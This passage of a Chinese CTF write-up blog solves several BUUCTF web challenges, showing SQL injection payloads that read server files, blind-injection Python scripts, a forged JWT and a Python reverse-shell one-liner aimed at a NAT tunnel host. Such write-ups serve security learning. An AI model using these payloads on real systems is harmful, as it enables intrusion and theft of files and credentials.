&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</code></pre><p>输入的内容都被addslashes过滤了，但是再comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入</p><p>在发帖部分：的category里输入x&#39;,content=database(),/*</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213616672.png" alt="image-20211117213616672"></p><p>再在提交留言里</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213710038.png" alt="image-20211117213710038"></p><p>这样可以形成多行注释，注释掉原有的content字段</p><p>可以得到数据库名称</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213738173.png" alt="image-20211117213738173"></p><p>这时查询语句为</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;,            content &#x3D; &#39;*&#x2F;#&#39;,            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>即</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p><strong>SQL读取文件</strong><br>用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p><strong>.bash_history</strong></p><p>.bash_history为在unix/linux系统下保存历史命令的文件，在用户的根目录下，即<code>~/</code>处。</p><p><strong>.DS_Store文件泄露</strong></p><p>文件泄露，有一个下载至本地的<a href="https://github.com/lijiejie/ds_store_exp">脚本</a>，不过这题用不上。</p><p>在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666</p><p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214221610.png" alt="image-20211117214221610"></p><p>（我也不知道查这里的目的是什么，但是百度其他师傅的wp都有这步</p><p>应该是为了知道.bash_histroy文件的路径</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214325543.png" alt="image-20211117214325543"></p><p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214355622.png" alt="image-20211117214355622"></p><p>接着再查.DS_Store</p><p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p><p>为了使其全部显示，要用hex编码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214600582.png" alt="image-20211117214600582"></p><p>然后解码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214639450.png" alt="image-20211117214639450"></p><p>看见有个flag文件</p><p>读一下</p><p>&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214713821.png" alt="image-20211117214713821"></p><p>再解码，拿到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214747130.png" alt="image-20211117214747130"></p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>注册个账号，登录，看到有个getflag但是提示权限不够</p><p>查看源码发现全是js的</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122204752692.png" alt="image-20211122204752692"></p><p>看一下app.js</p><pre class="language-none"><code class="language-none">&#x2F;** *  或许该用 koa-static 来处理静态文件 *  路径该怎么配置？不管了先填个根目录XD *&#x2F;function login() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    const token &#x3D; sessionStorage.getItem(&quot;token&quot;);    $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;)        .done(function(data) &#123;            const &#123;status&#125; &#x3D; data;            if(status) &#123;                document.location &#x3D; &quot;&#x2F;home&quot;;            &#125;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function register() &#123;    const username &#x3D; $(&quot;#username&quot;).val();    const password &#x3D; $(&quot;#password&quot;).val();    $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;)        .done(function(data) &#123;            const &#123; token &#125; &#x3D; data;            sessionStorage.setItem(&#39;token&#39;, token);            document.location &#x3D; &quot;&#x2F;login&quot;;        &#125;)        .fail(function(xhr, textStatus, errorThrown) &#123;            alert(xhr.responseJSON.message);        &#125;);&#125;function logout() &#123;    $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123;        const &#123;status&#125; &#x3D; data;        if(status) &#123;            document.location &#x3D; &#39;&#x2F;login&#39;;        &#125;    &#125;);&#125;function getflag() &#123;    $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123;        const &#123;flag&#125; &#x3D; data;        $(&quot;#username&quot;).val(flag);    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。<br>在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞</p><p>这里需要对koa框架的目录有一定的了解</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122205026873.png" alt="image-20211122205026873"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873007950084a1a7b518c2216100ff330f7ed7a6.png" alt="img"></p><p>访问一下controllers路径下的api.js</p><p>额，这里赵总说是经验。。。</p><pre class="language-none"><code class="language-none">const crypto &#x3D; require(&#39;crypto&#39;);const fs &#x3D; require(&#39;fs&#39;)const jwt &#x3D; require(&#39;jsonwebtoken&#39;)const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError;module.exports &#x3D; &#123;    &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123;        const &#123;username, password&#125; &#x3D; ctx.request.body;        if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);        &#125;        if(global.secrets.length &gt; 100000) &#123;            global.secrets &#x3D; [];        &#125;        const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);        const secretid &#x3D; global.secrets.length;        global.secrets.push(secret)        const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);        ctx.rest(&#123;            token: token        &#125;);        await next();    &#125;,    &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123;        const &#123;username, password&#125; &#x3D; ctx.request.body;        if(!username || !password) &#123;            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);        &#125;        const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;        console.log(sid)        if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123;            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        &#125;        const secret &#x3D; global.secrets[sid];        const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);        const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password;        if(status) &#123;            ctx.session.username &#x3D; username;        &#125;        ctx.rest(&#123;            status        &#125;);        await next();    &#125;,    &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123;        if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123;            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);        &#125;        const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString();        ctx.rest(&#123;            flag        &#125;);        await next();    &#125;,    &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123;        ctx.session.username &#x3D; null;        ctx.rest(&#123;            status: true        &#125;)        await next();    &#125;&#125;;</code></pre><p>赵总wp里的审计:</p><p>注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873008936cf41d35abc0ecab06b6f56706bee1b5-1024x542.png" alt="img"></p><p>登录 /api/login，接受传入的 username 和 password，然后从令牌的信息段中取 key 的 id，从程序中的全局数组取出 key，然后进行验证，验证通过之后置 session 中的 username 为登录时使用的 username。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301099a4070df83cd56999e7efbafb05e2e004-1024x757.png" alt="img"></p><p>获取FLAG /api/flag，判断 session 中的用户名是否为 admin，是的话就直接给 flag。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301284fe28eb6eb5a5362ed0749a45de8eb406-1024x468.png" alt="img"></p><p>可以看到信息是用 jwt 令牌储存的，使用 jsonwebtoken 库来操作，这里用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。</p><p>在登录界面抓包后边这串就是jwt（当时忘了截图，这是改完jwt之后的了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210021834.png" alt="image-20211122210021834"></p><p>之后在<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>里解码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210147429.png" alt="image-20211122210147429"></p><p>接下来也是赵总的分析：</p><p>回到源程序逻辑中，若想让这里的密钥 key为空，就需要修改上面的 secretid。那么就尝试修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。</p><p><a href="https://www.zhaoj.in/wp-content/uploads/2020/04/15873021389c8e46ed2ff4ebdc4215e90585dbcd31.png"><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873021389c8e46ed2ff4ebdc4215e90585dbcd31-1024x245.png" alt="img"></a></p><p>注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。可以做一个小实验来验证我们的想法。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/158730244598990809373d961e187fa7d0a66cc4ce-1024x459.png" alt="img">一个小实验，空数组与数字比较永远为真，当然用空字符串之类的也可以</p><p>最后利用python的PyJWT库来加密</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210434868.png" alt="image-20211122210434868"></p><p>抓包再放包就可以读取这个flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210523101.png" alt="image-20211122210523101"></p><p><a href="https://www.zhaoj.in/read-6512.html">虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in)</a></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>or被过滤了，没法用information查表了，但是可以用</p><pre class="language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;1032||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()</code></pre><p>正确的时候返回Nu1L，错误时返回V&amp;N</p><p>爆表脚本</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot;payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;database&#x3D; &#39;&#39;for i in range(1,1000):low &#x3D; 32heigh &#x3D; 128mid &#x3D; (low + heigh) &#x2F;&#x2F; 2while (low &lt; heigh):payload1 &#x3D; payload.format(i,mid)post_data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;post_data)print(payload1)if &quot;Nu1L&quot; in r.text:low &#x3D; mid + 1else:heigh &#x3D; midmid &#x3D; (low + heigh) &#x2F;&#x2F; 2if mid &#x3D;&#x3D; 32:breakdatabase +&#x3D;chr(mid)print(database)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123202113511.png" alt="image-20211123202113511"></p><p>得到表名后，拿不到列名，这里可以用无列名注入</p><p>先贴payload</p><p>2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p><p>采用了字符偏移</p><ul><li><p>按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符</p></li><li><p>所以最后的mid要减一才是正确的字符</p></li><li><p>这里我们传入十六进制，mysql会自动将十六进制转为字符</p></li><li><p>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 </p></li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123202924585.png" alt="image-20211123202924585"></p><p>这里要和flag的表的列数一样</p><p>最后跑一下拿flag</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot;#payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;change &#x3D; &#39;&#39;database&#x3D; &#39;&#39;for j in range(1,100):for i in range(32,128):change &#x3D; database+chr(i)payload1 &#x3D; payload.format(change)print(payload1)data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;data)if &#39;Nu1L&#39; in r.text:database +&#x3D; chr(i-1)print(database)break</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123205558046.png" alt="image-20211123205558046"></p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>抓包之后一直往下走</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211557104.png" alt="image-20211123211557104"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211609605.png" alt="image-20211123211609605"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211625629.png" alt="image-20211123211625629"></p><p>源码里找不到就去看js</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211646833.png" alt="image-20211123211646833"></p><p>最后可以找到一个</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211708969.png" alt="image-20211123211708969"></p><p>随机排列组合得到flag</p><pre class="language-none"><code class="language-none">from itertools import permutationsflag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item &#x3D; permutations(flag)#对flag全排列，返回的是iterators（迭代器）for i in item:k &#x3D; &#39;&#39;.join(i)#join连接成为字符串if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;这里还可以用python的startswich方法判断是否是pctf&#123;hey开头&#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;:print(k)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211727781.png" alt="image-20211123211727781"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>抓session，base64解码把金额改成100，放包</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124200900405.png" alt="image-20211124200900405"></p><p>源码没东西，只有个url的get参数，还以为是ssrf之类的，搜了下wp，这里可能是因为环境原因，有个非预期解</p><p>非预期解：</p><p>有文件读取，直接url=/flag就能下载一个beautiful.jpg,改成txt就能看见flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124201030250.png" alt="image-20211124201030250"></p><p>预期解：</p><p><strong>/proc/self/目录的意义</strong></p><p>我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124202121899.png" alt="image-20211124202121899"></p><p>读一下app.py</p><p>url=app.py</p><pre class="language-none"><code class="language-none">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp &#x3D; Flask(__name__)SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot;f &#x3D; open(SECRET_FILE)SECRET_KEY &#x3D; f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;&#x2F;page&#39;)def page():    url &#x3D; request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res &#x3D; urllib.urlopen(url)            value &#x3D; res.read()            response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39;            return response        else:            value &#x3D; &quot;HACK ERROR!&quot;    except:        value &#x3D; &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res&#x3D;value)@app.route(&#39;&#x2F;no_one_know_the_manager&#39;)def manager():    key &#x3D; request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key &#x3D;&#x3D; SECRET_KEY:        shell &#x3D; request.args.get(&quot;shell&quot;)        os.system(shell)        res &#x3D; &quot;ok&quot;    else:        res &#x3D; &quot;Wrong Key!&quot;    return resif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080)</code></pre><p>可以看到<code>no_one_know_the_manager</code>中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了</p><p>但是这个文件是用open打开的，会创建文件描述符。</p><p>我们读这个文件描述符中的内容就好了此处可以通过<code>/proc/pid/fd/</code>读取，这个目录包含了进程打开的每一个文件的链接</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203011498.png" alt="image-20211124203011498"></p><p>拿到key的内容，要url编码，但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203433334.png" alt="image-20211124203433334"></p><hr><p>nmd弹了几个小时终于弹tan出来了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB[BZ_FAPY[LK8VR.png" alt="img"></p><p>这玩意要公网ip，搜了一圈没一个说这个事的，</p><p>没公网ip，搞了个端口映射后的公网</p><p><a href="https://blog.csdn.net/weixin_41598660/article/details/105254229">(23条消息) 端口映射后的公网反弹shell_来到了学渣的博客-CSDN博客</a></p><p><a href="https://natapp.cn/register">https://natapp.cn/register</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001711038.png" alt="image-20211125001711038"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001738005.png" alt="image-20211125001738005"></p><p>把本地的8082端口映射到公网</p><p>把这个payload当shell参数的值打进去</p><pre class="language-none"><code class="language-none">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p>然后在Ubuntu里监听8082端口，从根目录里找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB[BZ_FAPY[LK8VR.png" alt="img"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125002051230.png" alt="image-20211125002051230"></p><p>泪目</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>文件上传，但是这个flie参数感觉可以直接文件读取</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125203202419.png" alt="image-20211125203202419"></p><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre class="language-none"><code class="language-none">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;&#x2F;title&gt;     &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt;     &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;         &lt;div class&#x3D;&quot;container-fluid&quot;&gt;         &lt;div class&#x3D;&quot;navbar-header&quot;&gt;             &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt;         &lt;&#x2F;div&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;         &lt;&#x2F;div&gt;     &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre class="language-none"><code class="language-none">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123;     $show-&gt;source &#x3D; $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>upload_file.php</p><pre class="language-none"><code class="language-none">&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;     &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt;     &lt;input 